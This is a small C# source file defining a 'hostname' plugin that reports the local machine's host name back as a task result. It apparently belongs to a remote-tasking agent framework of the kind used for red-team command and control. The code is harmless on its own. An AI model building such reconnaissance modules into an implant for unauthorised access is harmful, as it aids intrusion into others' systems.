using Athena.Models;
using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.Net;
using Athena.Commands;

namespace Plugins
{
    public class HostName : AthenaPlugin
    {
        public override string Name => "hostname";
        public override void Execute(Dictionary<string, string> args)
        {
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                completed = true,
                user_output = Dns.GetHostName(),
                task_id = args["task-id"],
            });
        }
    }
}
